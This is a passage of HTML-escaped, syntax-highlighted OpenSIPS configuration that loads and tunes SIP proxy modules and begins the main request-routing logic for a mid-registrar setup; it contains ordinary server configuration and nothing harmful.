&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;,   0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line not to allow more than &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; contacts per AOR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;registrar&amp;#34;, &amp;#34;max_contacts&amp;#34;, 10)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure the enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### UDP protocol&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential requests within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# do accunting, even if the transaction fails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# even if in most of the cases is useless, do RR for&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# re-INVITEs alos, as some buggy clients do change route set&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# during the dialog.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# non loose-route, but stateful ACK; must be an ACK after &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# a 487 or e.g. 404 from upstream server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# ACK without matching transaction -&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# ignore and discard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		mid_registrar_save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		switch &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$retcode&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; 1:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;forwarding REGISTER to main registrar (&lt;/span&gt;$$&lt;span style=&#34;color:#e6db74&#34;&gt;ci=&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
